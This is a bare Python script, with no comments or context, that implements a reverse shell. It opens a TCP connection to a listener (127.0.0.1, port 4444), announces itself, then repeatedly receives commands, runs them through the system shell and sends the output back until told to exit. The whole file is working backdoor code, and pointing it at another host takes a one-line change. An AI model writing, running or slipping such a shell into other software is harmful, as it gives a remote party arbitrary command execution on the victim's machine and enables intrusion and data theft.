import socket
import subprocess

HOST = "127.0.0.1"
PORT = 4444

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))


s.send(b"Connected! Ready.\n")


while True:
    data = s.recv(1024)
    if data.decode() == "exit":
        break
    output = subprocess.run(data.decode(), shell=True, capture_output=True)
    s.send(output.stdout + output.stderr)
